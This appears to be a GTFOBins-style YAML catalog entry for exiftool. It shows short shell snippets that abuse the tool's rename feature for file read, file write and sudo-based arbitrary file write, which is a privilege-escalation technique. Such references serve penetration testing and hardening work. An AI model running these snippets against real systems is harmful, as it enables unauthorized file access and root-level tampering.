---
description: |
  `exiftool` has a functionality to rename files, it can be abused to move files to different paths.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        OUTPUT=output_file
        exiftool -filename=$OUTPUT $LFILE
        cat $OUTPUT
  file-write:
    - code: |
        LFILE=file_to_write
        INPUT=input_file
        exiftool -filename=$LFILE $INPUT
  sudo:
    - code: |
        LFILE=file_to_write
        INPUT=input_file
        sudo exiftool -filename=$LFILE $INPUT
---
